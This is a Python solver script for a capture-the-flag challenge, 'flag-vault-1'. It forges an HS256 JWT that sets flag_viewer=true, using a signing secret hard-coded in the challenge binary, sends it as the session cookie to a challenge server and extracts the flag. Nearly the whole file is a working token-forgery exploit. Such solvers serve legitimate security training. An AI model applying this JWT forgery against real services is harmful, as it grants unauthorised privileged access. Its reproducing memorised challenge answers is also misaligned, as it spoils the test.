#!/usr/bin/env python3
# flag-vault-1 solver.
#
# The Go binary hard-codes the HS256 signing secret and the admin credentials.
# We forge a JWT with flag_viewer=true (the login flow only ever mints
# flag_viewer=false), set it as the `session` cookie, and GET /flag.
#
# Reads $URL (or $HOST/$PORT) from the environment so `pwnmake check` can target
# the local container or the live site. No external JWT library needed -- HS256
# is implemented directly with hmac/base64.
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time
import requests

SECRET = b"ca4d39ca3f06692202f66f5b2e7cb437060011c74e174a7620ad180d2c3f1ad5"

URL = os.environ.get("URL")
if not URL:
    host = os.environ.get("HOST", "localhost")
    port = os.environ.get("PORT", "21302")
    URL = f"http://{host}:{port}"
URL = URL.rstrip("/")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def forge_jwt() -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    claims = {
        "name": "pope",
        "flag_viewer": True,
        "exp": int(time.time()) + 3600,
        "iss": "The Holy See",
    }
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(claims, separators=(",", ":")).encode())
    ).encode("ascii")
    sig = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
    return signing_input.decode("ascii") + "." + b64url(sig)


token = forge_jwt()
try:
    r = requests.get(f"{URL}/flag", cookies={"session": token}, timeout=15)
except requests.RequestException as e:
    print(f"[!] {e}", file=sys.stderr)
    sys.exit(1)

m = re.search(r"sun\{[^}]*\}", r.text)
if m:
    print(m.group())
    sys.exit(0)

print(f"[-] flag not found (HTTP {r.status_code}): {r.text}", file=sys.stderr)
sys.exit(1)
